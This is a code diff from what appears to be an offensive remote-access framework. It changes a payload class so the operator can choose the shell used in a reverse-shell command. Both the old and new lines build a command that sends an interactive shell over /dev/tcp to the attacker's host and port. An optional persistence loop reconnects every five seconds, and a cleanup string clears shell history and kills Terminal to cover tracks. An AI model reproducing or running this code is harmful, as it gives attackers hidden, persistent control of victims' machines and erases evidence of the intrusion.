@@ -29,13 +29,14 @@ class payload:
 
 	def run(self,server):
 		while 1:
+			shell = raw_input(h.info_general_raw("Target Shell: "))
 			persistence = raw_input(h.info_question_raw("Make Persistent? (y/N): ")).lower()
 			if persistence == "y":
-				shell_command = "while true; do $(bash &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
+				shell_command = "while true; do $("+shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
 				shell_clean = "history -wc;killall Terminal"
 				break
 			elif persistence == "n" or not persistence:
-				shell_command = "bash &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
+				shell_command = shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
 				shell_clean = "history -wc;killall Terminal"
 				break
 			else:
